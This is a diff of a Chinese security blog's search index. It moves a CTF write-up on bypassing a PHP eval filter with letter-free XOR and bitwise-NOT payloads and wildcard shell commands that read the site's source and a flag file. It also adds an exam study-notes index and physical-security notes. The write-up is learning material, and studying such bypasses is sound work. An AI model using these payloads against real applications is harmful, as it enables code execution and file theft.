@@ -520,6 +520,45 @@
       </tags>
   </entry>
   <entry>
+    <title>CTF一道web题小结-无数字字母getFlag()</title>
+    <url>/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/</url>
+    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近遇到个CTF题目，分析后涨了波知识，题目如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  &quot;php function getFlag() to get flag&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><a id="more"></a><br>分析代码，了解到我们需要满足两个条件：</p>
+<ol>
+<li>长度不能大于35</li>
+<li>不能存在数字字母_和$符号</li>
+</ol>
+<h2 id="0x02-无数字字母构造payload"><a href="#0x02-无数字字母构造payload" class="headerlink" title="0x02 无数字字母构造payload"></a>0x02 无数字字母构造payload</h2><p>首先，看到不能存在字母数字就想到了phithon师傅的文章里关于无字母数字webshell提到的3种方法提供了两种思路：</p>
+<ol>
+<li>利用位运算</li>
+<li>利用自增运算符<br>想到payload应该是code=getFlag(),于是开始构造getFlag()。<br>在网上找到一个payload如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;$_();</span><br></pre></td></tr></table></figure>
+分析：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">采用异或运算</span><br><span class="line">&#123; ^ %1c &#x3D; g</span><br><span class="line">&#123; ^ %1e &#x3D; e</span><br><span class="line">&#123; ^ %0f &#x3D; t</span><br><span class="line">&#123; ^ %3d &#x3D; F</span><br><span class="line">&#123; ^ %17 &#x3D; l</span><br><span class="line">&#123; ^ %1a &#x3D; a</span><br><span class="line">所以&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot; &#x3D; getFlag</span><br><span class="line">$_&#x3D;getFlag将_赋值为getFlag，最终得到getFlag()。</span><br></pre></td></tr></table></figure>
+还有个payload为<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;~%98%9A%8B%B9%93%9E%98;$_();</span><br></pre></td></tr></table></figure>
+直接取反getFlag再url编码。<br>其中_可以使用汉字代替，如<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$啊&#x3D;~%98%9A%8B%B9%93%9E%98;$啊();</span><br></pre></td></tr></table></figure>
+当不过滤<strong>$</strong>符号时,可以这样操作，但是<strong>$</strong>符号过滤了，参考p牛的《无字母数字webshell之提高篇》中讲到PHP7是允许使用($a)()来执行动态函数;<br>此时，测试使用phpinfo();payload如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>
+使用php5进行测试时如下：<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/php5测试phpinfo.PNG" alt></li>
+</ol>
+<p>获取phpinfo信息失败。</p>
+<p>使用php7进行测试时如下：<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/php7测试phpinfo.PNG" alt></p>
+<p>获取phpinfo信息成功。</p>
+<h2 id="0x03-解题思路"><a href="#0x03-解题思路" class="headerlink" title="0x03 解题思路"></a>0x03 解题思路</h2><p>利用通配符调用Linux系统命令 来查看flag。<br>在Linux系统中可以使用? * 等字符来正则匹配字母：</p>
+<ul>
+<li>*可以代替0个及以上任意字符</li>
+<li>?可以代表1个任意字符</li>
+</ul>
+<p>可以使用?来代替字符：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;??? &#x3D;&gt; &#x2F;bin&#x2F;cat</span><br></pre></td></tr></table></figure><br>用此来读取源码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;???&#x2F;???&#x2F;????&#x2F;?????.???&#96;;?&gt;&lt;?&#x3D;$_?&gt;</span><br><span class="line">&quot;&#x2F;bin&#x2F;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&quot;</span><br></pre></td></tr></table></figure><br>为保持长度小于35且不存在$_,则将$_带入后面一个表达式，同时使用*来匹配最后文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;???&#x2F;???&#x2F;????&#x2F;*&#96;?&gt;</span><br></pre></td></tr></table></figure><br>php使用短链接，其含义如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php echo &#96;&#x2F;bin&#x2F;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#96;?&gt;</span><br></pre></td></tr></table></figure><br>读取到源码发现存在如下函数：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getFlag()&#123;</span><br><span class="line">	$flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;);</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>最后直接读取flag文件。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;????&#96;;?&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x04-其它思考"><a href="#0x04-其它思考" class="headerlink" title="0x04 其它思考"></a>0x04 其它思考</h2><p>windows中将if(preg_match(“/[A-Za-z0-9_$]+/“,$code))过滤修改，去除对大写字母或小写的过滤，由于windows对大小写不敏感，可以在windows系统中尝试执行任意代码<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/windows执行任意代码.PNG" alt></p>
+<p>不对if(preg_match(“/[A-Za-z0-9_$]+/“,$code))进行修改，将whoami进行取反再url编码：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~%88%97%90%9E%92%96</span><br></pre></td></tr></table></figure><br>则失败。<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/windows绕过失败.PNG" alt></p>
+<p>去除[A-Za-z0-9_$]同样也无法执行代码，可见在windows中对命令进行位运算后会执行失败。</p>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://xz.aliyun.com/t/2597#toc-8">[红日安全]PHP-Audit-Labs题解之Day5-8</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a><br><a href="https://www.anquanke.com/post/id/154284">CTF题目思考—极限利用</a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>汇编指令</title>
     <url>/2018/09/05/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/</url>
     <content><![CDATA[<h2 id="数据定义"><a href="#数据定义" class="headerlink" title="数据定义"></a>数据定义</h2><p>db定义字节类型变量，一个字节数据占1个字节（8位）单元，读完一个，偏移量加1<br>dw定义字类型变量，一个字数据占2个字节（16位）单元，读完一个，偏移量加2<br>dd定义双字类型变量，一个双字数据占4个字节（32位）单元，读完一个，偏移量加4<br>dup操作符用来进行数据的重复：<br>db 重复的次数 dup (重复的字节型数据)。<br>dw 重复的次数 dup (重复的字型数据)。<br>dd 重复的次数 dup (重复的双字数据)。<br><a id="more"></a></p>
@@ -606,45 +645,6 @@
       <tags>
         <tag>逆向</tag>
         <tag>汇编</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF一道web题小结-无数字字母getFlag()</title>
-    <url>/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/</url>
-    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近遇到个CTF题目，分析后涨了波知识，题目如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  &quot;php function getFlag() to get flag&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><a id="more"></a><br>分析代码，了解到我们需要满足两个条件：</p>
-<ol>
-<li>长度不能大于35</li>
-<li>不能存在数字字母_和$符号</li>
-</ol>
-<h2 id="0x02-无数字字母构造payload"><a href="#0x02-无数字字母构造payload" class="headerlink" title="0x02 无数字字母构造payload"></a>0x02 无数字字母构造payload</h2><p>首先，看到不能存在字母数字就想到了phithon师傅的文章里关于无字母数字webshell提到的3种方法提供了两种思路：</p>
-<ol>
-<li>利用位运算</li>
-<li>利用自增运算符<br>想到payload应该是code=getFlag(),于是开始构造getFlag()。<br>在网上找到一个payload如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;$_();</span><br></pre></td></tr></table></figure>
-分析：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">采用异或运算</span><br><span class="line">&#123; ^ %1c &#x3D; g</span><br><span class="line">&#123; ^ %1e &#x3D; e</span><br><span class="line">&#123; ^ %0f &#x3D; t</span><br><span class="line">&#123; ^ %3d &#x3D; F</span><br><span class="line">&#123; ^ %17 &#x3D; l</span><br><span class="line">&#123; ^ %1a &#x3D; a</span><br><span class="line">所以&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot; &#x3D; getFlag</span><br><span class="line">$_&#x3D;getFlag将_赋值为getFlag，最终得到getFlag()。</span><br></pre></td></tr></table></figure>
-还有个payload为<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;~%98%9A%8B%B9%93%9E%98;$_();</span><br></pre></td></tr></table></figure>
-直接取反getFlag再url编码。<br>其中_可以使用汉字代替，如<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$啊&#x3D;~%98%9A%8B%B9%93%9E%98;$啊();</span><br></pre></td></tr></table></figure>
-当不过滤<strong>$</strong>符号时,可以这样操作，但是<strong>$</strong>符号过滤了，参考p牛的《无字母数字webshell之提高篇》中讲到PHP7是允许使用($a)()来执行动态函数;<br>此时，测试使用phpinfo();payload如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>
-使用php5进行测试时如下：<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/php5测试phpinfo.PNG" alt></li>
-</ol>
-<p>获取phpinfo信息失败。</p>
-<p>使用php7进行测试时如下：<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/php7测试phpinfo.PNG" alt></p>
-<p>获取phpinfo信息成功。</p>
-<h2 id="0x03-解题思路"><a href="#0x03-解题思路" class="headerlink" title="0x03 解题思路"></a>0x03 解题思路</h2><p>利用通配符调用Linux系统命令 来查看flag。<br>在Linux系统中可以使用? * 等字符来正则匹配字母：</p>
-<ul>
-<li>*可以代替0个及以上任意字符</li>
-<li>?可以代表1个任意字符</li>
-</ul>
-<p>可以使用?来代替字符：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;??? &#x3D;&gt; &#x2F;bin&#x2F;cat</span><br></pre></td></tr></table></figure><br>用此来读取源码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;???&#x2F;???&#x2F;????&#x2F;?????.???&#96;;?&gt;&lt;?&#x3D;$_?&gt;</span><br><span class="line">&quot;&#x2F;bin&#x2F;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&quot;</span><br></pre></td></tr></table></figure><br>为保持长度小于35且不存在$_,则将$_带入后面一个表达式，同时使用*来匹配最后文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;???&#x2F;???&#x2F;????&#x2F;*&#96;?&gt;</span><br></pre></td></tr></table></figure><br>php使用短链接，其含义如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php echo &#96;&#x2F;bin&#x2F;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#96;?&gt;</span><br></pre></td></tr></table></figure><br>读取到源码发现存在如下函数：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getFlag()&#123;</span><br><span class="line">	$flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;);</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>最后直接读取flag文件。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;????&#96;;?&gt;</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x04-其它思考"><a href="#0x04-其它思考" class="headerlink" title="0x04 其它思考"></a>0x04 其它思考</h2><p>windows中将if(preg_match(“/[A-Za-z0-9_$]+/“,$code))过滤修改，去除对大写字母或小写的过滤，由于windows对大小写不敏感，可以在windows系统中尝试执行任意代码<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/windows执行任意代码.PNG" alt></p>
-<p>不对if(preg_match(“/[A-Za-z0-9_$]+/“,$code))进行修改，将whoami进行取反再url编码：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~%88%97%90%9E%92%96</span><br></pre></td></tr></table></figure><br>则失败。<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/windows绕过失败.PNG" alt></p>
-<p>去除[A-Za-z0-9_$]同样也无法执行代码，可见在windows中对命令进行位运算后会执行失败。</p>
-<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://xz.aliyun.com/t/2597#toc-8">[红日安全]PHP-Audit-Labs题解之Day5-8</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a><br><a href="https://www.anquanke.com/post/id/154284">CTF题目思考—极限利用</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -901,6 +901,30 @@
       </tags>
   </entry>
   <entry>
+    <title>2020年软考--信息安全工程师学习笔记</title>
+    <url>/2020/09/09/2020%E5%B9%B4%E8%BD%AF%E8%80%83-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<p>2020年准备报考信息安全工程师，8月底出了《信息安全工程师教程（第2版）》，原来8大章节变成了26章（？？？），考试出题也以新版教程和大纲出题。</p>
+<p><img src="/2020/09/09/2020%E5%B9%B4%E8%BD%AF%E8%80%83-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/黑人问号.jpeg" alt></p>
+<a id="more"></a>
+<p><strong>不定期更新</strong></p>
+<p><a href="https://fl4g.cn/2020/09/09/第1章-网络信息安全概述/">第1章 网络信息安全概述</a></p>
+<p><a href="https://fl4g.cn/2020/09/10/第2章-网络攻击原理与常用方法/">第2章 网络攻击原理与常用方法</a></p>
+<p><a href="https://fl4g.cn/2020/09/14/第3章-密码学基本理论/">第3章 密码学基本理论</a></p>
+<p><a href="https://fl4g.cn/2020/09/16/第4章-网络安全体系与网络安全模型/">第4章 网络安全体系与网络安全模型</a></p>
+<p><a href="https://fl4g.cn/2020/09/17/第5章-物理环境安全技术/">第5章 物理环境安全技术</a></p>
+<p><a href="https://fl4g.cn/2020/09/18/第7章-访问控制技术原理与应用/">第7章 访问控制技术原理与应用</a></p>
+<p><a href="https://fl4g.cn/2020/09/18/第8章-防火墙技术原理与应用/">第8章 防火墙技术原理与应用</a></p>
+<p>推荐看信管网最新解读视频：</p>
+<p><a href="https://www.cnitpm.com/shipin/play.aspx?id=218">信息安全工程师教程（第2版）解读视频</a></p>
+]]></content>
+      <categories>
+        <category>信息安全工程师软考</category>
+      </categories>
+      <tags>
+        <tag>学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PWN中伪随机数问题--srand()/rand()</title>
     <url>/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/</url>
     <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>PWN中通常使用srand()和rand()配合使用来设置伪随机数。通常当我们输入的数可以覆盖到srand()中的值时，我们可以预测rand()产生固定序列。</p>
@@ -931,30 +955,6 @@
       </categories>
       <tags>
         <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2020年软考--信息安全工程师学习笔记</title>
-    <url>/2020/09/09/2020%E5%B9%B4%E8%BD%AF%E8%80%83-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<p>2020年准备报考信息安全工程师，8月底出了《信息安全工程师教程（第2版）》，原来8大章节变成了26章（？？？），考试出题也以新版教程和大纲出题。</p>
-<p><img src="/2020/09/09/2020%E5%B9%B4%E8%BD%AF%E8%80%83-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/黑人问号.jpeg" alt></p>
-<a id="more"></a>
-<p><strong>不定期更新</strong></p>
-<p><a href="https://fl4g.cn/2020/09/09/第1章-网络信息安全概述/">第1章 网络信息安全概述</a></p>
-<p><a href="https://fl4g.cn/2020/09/10/第2章-网络攻击原理与常用方法/">第2章 网络攻击原理与常用方法</a></p>
-<p><a href="https://fl4g.cn/2020/09/14/第3章-密码学基本理论/">第3章 密码学基本理论</a></p>
-<p><a href="https://fl4g.cn/2020/09/16/第4章-网络安全体系与网络安全模型/">第4章 网络安全体系与网络安全模型</a></p>
-<p><a href="https://fl4g.cn/2020/09/17/第5章-物理环境安全技术/">第5章 物理环境安全技术</a></p>
-<p><a href="https://fl4g.cn/2020/09/18/第7章-访问控制技术原理与应用/">第7章 访问控制技术原理与应用</a></p>
-<p><a href="https://fl4g.cn/2020/09/18/第8章-防火墙技术原理与应用/">第8章 防火墙技术原理与应用</a></p>
-<p>推荐看信管网最新解读视频：</p>
-<p><a href="https://www.cnitpm.com/shipin/play.aspx?id=218">信息安全工程师教程（第2版）解读视频</a></p>
-]]></content>
-      <categories>
-        <category>信息安全工程师软考</category>
-      </categories>
-      <tags>
-        <tag>学习笔记</tag>
       </tags>
   </entry>
   <entry>
@@ -1305,6 +1305,172 @@ C^d=M mod (P)</script><p>在已知C和P的前提下，由d求M很容易，由M�
       </tags>
   </entry>
   <entry>
+    <title>第5章 物理环境安全技术</title>
+    <url>/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/</url>
+    <content><![CDATA[<h1 id="物理安全概念与要求"><a href="#物理安全概念与要求" class="headerlink" title="物理安全概念与要求"></a>物理安全概念与要求</h1><h2 id="物理安全威胁"><a href="#物理安全威胁" class="headerlink" title="物理安全威胁"></a>物理安全威胁</h2><p>常见威胁：</p>
+<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/物理安全威胁.jpg" alt></p>
+<a id="more"></a>
+<p>攻击技术：硬件木马、硬件协同的恶意代码、硬件安全漏洞利用、基于软件漏洞攻击硬件实体、基于环境攻击计算机实体。</p>
+<h2 id="物理安全保护"><a href="#物理安全保护" class="headerlink" title="物理安全保护"></a>物理安全保护</h2><ol>
+<li>设备物理安全：有标志和标记、防止电磁信息泄露、抗电磁干扰、安全漏洞等</li>
+<li>环境物理安全：机房选择、防护</li>
+<li>系统物理安全：存储介质，灾备、访问保护</li>
+</ol>
+<p>方法：安全合规、访问控制、安全屏蔽、故障容错、安全监测与预警、供应链安全管理和容灾备份等。</p>
+<h2 id="物理安全规范"><a href="#物理安全规范" class="headerlink" title="物理安全规范"></a>物理安全规范</h2><p>《信息系统物理安全技术要求（GB/T 21052-2007）》分4级保护：</p>
+<ol>
+<li>第一级用户自主保护级提供基本的物理安全保护</li>
+<li>第二级系统审计保护级提供适当的物理安全保护</li>
+<li>第三级安全标记保护级提供较高程度的物理安全保护</li>
+<li>第四级结构化保护级提供更高程度的物理安全保护</li>
+</ol>
+<h1 id="物理环境安全分析与防护"><a href="#物理环境安全分析与防护" class="headerlink" title="物理环境安全分析与防护"></a>物理环境安全分析与防护</h1><ol>
+<li><p><strong> 防火</strong></p>
+<p>理想灭火材料：卤代烷1211和1301灭火剂</p>
+</li>
+<li><p><strong>防水</strong></p>
+<p>不要把机房设置在楼房底层或地下室</p>
+</li>
+<li><p><strong>防震</strong></p>
+</li>
+<li><p><strong>防盗</strong></p>
+<p>报警器和监控、物理访问控制</p>
+</li>
+<li><p><strong>防鼠虫害</strong></p>
+<p>危害：咬坏电缆或引起电源短路</p>
+</li>
+<li><p><strong>防雷</strong></p>
+<p>避雷针及专用防雷设施，设备接地</p>
+</li>
+<li><p><strong>防电磁</strong></p>
+<p>防止电磁干扰，防止信息通过电磁泄漏。措施：接地、屏蔽、选择合适场地</p>
+</li>
+<li><p><strong>防静电</strong></p>
+<p>人员服装、机房温湿度、材料、操作戴防静电手套</p>
+</li>
+<li><p><strong>安全供电</strong></p>
+<p>专用电线路、不间断电源（UPS）、备用发电机</p>
+</li>
+</ol>
+<h1 id="机房安全分析与防护"><a href="#机房安全分析与防护" class="headerlink" title="机房安全分析与防护"></a>机房安全分析与防护</h1><h2 id="机房功能区域组成"><a href="#机房功能区域组成" class="headerlink" title="机房功能区域组成"></a>机房功能区域组成</h2><p>《计算机场地通用规范（GB/T 2887-2011）》（允许一室多用或酌情增减）：</p>
+<ol>
+<li>主要工作房间：主机房、终端室等；</li>
+<li>第一类辅助房间：低压配电间、不间断电源室、空调机室、发电机室、气体钢瓶室、监控室等</li>
+<li>第二类辅助房间：资料室、维修室、技术人员办公室</li>
+<li>第三类辅助房间：储藏室、缓冲间、技术人员休息室、盥洗室</li>
+</ol>
+<h2 id="机房安全等级划分"><a href="#机房安全等级划分" class="headerlink" title="机房安全等级划分"></a>机房安全等级划分</h2><p>《计算机场地通用规范（GB/T 2887-2011）》分为A、B、C三级：</p>
+<ul>
+<li>A：计算机系统运行中断后，会对国家安全、社会秩序、公共利益造成严重损害</li>
+<li>B：计算机系统运行中断后，会对国家安全、社会秩序、公共利益造成较大损害的</li>
+<li>C：不属于A、B级的情况</li>
+</ul>
+<p>安全级别要求：</p>
+<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/安全级别要求-1.jpg" alt></p>
+<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/安全级别要求-2.jpg" alt></p>
+<h2 id="机房场地选择要求"><a href="#机房场地选择要求" class="headerlink" title="机房场地选择要求"></a>机房场地选择要求</h2><ol>
+<li><p>环境安全性</p>
+<p>避开：危险来源区、环境污染区、盐雾区、落雷区</p>
+</li>
+<li><p>地质可靠性</p>
+<p>避开：杂填土、地层断裂、地质不牢靠、有开采价值矿区、低洼、潮湿</p>
+</li>
+<li><p>场地抗电磁干扰性</p>
+<p>避开：无线电干扰源和微波线路的强电磁场干扰场所（不大于800A/m，100e）、强电流冲击</p>
+</li>
+<li><p>应避开强振动源和强噪音源</p>
+<p>避开：振动源、机场、主要道路</p>
+</li>
+<li><p>应避免设在建筑物的高层以及用水设备的下层或隔壁</p>
+</li>
+</ol>
+<h2 id="数据中心建设与设计要求"><a href="#数据中心建设与设计要求" class="headerlink" title="数据中心建设与设计要求"></a>数据中心建设与设计要求</h2><ul>
+<li>超大型数据中心：&gt;=10000个标准机架；重点考虑气候环境、能源供给，优先在气候寒冷、能源充足的一类或气候适宜，能源充足的二类地区。</li>
+<li>大型数据中心：&gt;=3000，&lt;10000标准机架；重点考虑气候环境、能源供给，优先在一类二类地区，也可在气候适宜，靠近能源富集地的三类地区</li>
+<li>中小型数据中心：&lt;3000标准机架；重点考虑市场需求、能源供给，在靠近用户所在地、能源获取便利的地区建设。</li>
+</ul>
+<p>《设计规范》（2018.1.1）将数据中心分为A、B、C三级，强制性条文简述：</p>
+<ul>
+<li>所有设备的金属外壳、各类金属管道、金属线槽、建筑物金属结构必须进行等电位联结并接地（8.4.4）</li>
+<li>耐火等级不应低于二级（13.2.1）</li>
+<li>与气体供能用房在统一建筑内时，两者之间采用耐火极限不低于2.0h的防火隔墙和1.5h的楼板，隔墙上开门采用甲级防火门（13.2.4）</li>
+<li>采用管网式气体或细水雾灭火系统的主机房，应同时设置两组独立的火灾探测器，火灾报警系统英语灭火系统和视频监控系统联动（13.3.1）</li>
+<li>设置气体灭火系统的主机房，应配置专用空气呼吸器或氧气呼吸器（13.4.1）</li>
+</ul>
+<h2 id="互联网数据中心"><a href="#互联网数据中心" class="headerlink" title="互联网数据中心"></a>互联网数据中心</h2><p>IDC六大逻辑组成部分：</p>
